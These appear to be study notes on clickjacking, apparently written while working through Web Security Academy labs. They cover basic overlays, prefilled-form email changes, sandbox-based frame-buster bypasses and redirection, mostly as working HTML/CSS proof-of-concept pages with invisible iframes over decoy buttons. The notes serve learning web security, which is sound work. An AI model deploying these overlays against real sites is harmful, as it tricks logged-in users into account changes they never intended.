## What is clickjacking?
Clickjacking is creating a malicious website that contains a vulnerable website in an iframe, with the contents of that iframe laid beneath a social-engineering tactic to get the user that has an account on the vulnerable website to click it, to perform a malicious action on be-half of the attacker. The iframe of the vulnerable website has an opacity of 0, and because the user should be signed in with cookies, the overlaid malicious website will craft HTML to manipulate the victim to click it. ^fda329
##### ***Basic clickjacking attack***
There is a form with a CSRF token on the vulnerable website. Lay a website over the top and position it as index of 1 with the vulnerable website being an index of 2, and then make the malicious website display an enticing button that the logged in user will click. Position the malicious website to align with the vulnerable website's sensitive functions/buttons.  
<head>
	<style>
		body {
			margin: 0;
			width: 100%;
                        display: flex; 
                        flex-direction: column;
			overflow-y: hidden;
		}
		#target_website {
			position: relative;
			width: 100%;
			height: 100%;
			z-index: 2;
			box-sizing: border-box;
			border: none;
opacity: 0%;
			overflow: hidden;
		}
		#decoy_website {
			position: absolute;
			width: 100%;
			height: 100%;
			overflow: hidden;
			z-index: 1;
			border: 0;
		}
	</style>
</head>
```
<head>
	<style>
		#target_website {
			position:relative;
			width:100%;
			height:100%;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button style="position: absolute; left: 85px; top: 490px; border: 1px solid red; margin: auto; height: 20px; width: 60px;">click</button>
	</div>
	<iframe id="target_website"  scrolling="no" frameborder="0" src="https://0a00000103d28cc282310bd8004300b4.web-security-academy.net/my-account">
	</iframe>
</body>
```
##### ***Clickjacking with prefilled form input***
Some times websites will have a form that takes values from a URL as GET parameters. You can exploit this by adding your values to the query string, then create an exploit server with an overlay that makes the victim submit the form with the values from the URL. There was an issue with the button not being able to be clicked through into the iframe, adding `pointer-events: none;` seems to have fixed it.
```
<head>
	<style>
		#target_website {
			width: 100%;
			height: 100%;
			z-index: 10;
			box-sizing: border-box;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:11;
			}
		body {
			position: relative;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<div style="position: relative; z-index: -1; left: 0; top: 440px; pointer-events: none; border: 1px solid red; margin: auto; height: 20px; width: 60px;">click me</div>
	</div>
	<iframe id="target_website"  scrolling="no" frameborder="0" src="https://0a3d00b5043ac57c8119b6fd004000f4.web-security-academy.net/my-account?email=pwned@gmail.com">
	</iframe>
</body>
```
##### ***Clickjacking with frame busting scripts***
Frame busting scripts are designed to;
- check and enforce that the current application window is the main or top window.
- make all frames visible.
- prevent clicking on invisible frames.
- intercept and flag potential clickjacking attacks to the user.

In order to bypass this, use an iframe with the `sandbox` attribute. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:
```
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

Both the `allow-forms` and `allow-scripts` values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.
##### ***Redirection with clickjacking***
If the victim site is vulnerable to Clickjacking, the attacker could overlay a transparent iframe over some benign functionality on the website. When the user interacts with what they believe is the legitimate site, they would actually trigger the redirection:
```
<iframe src="http://vulnerable-website.com/redirect-to-trusted-subdomain" style="opacity:0;"></iframe>
```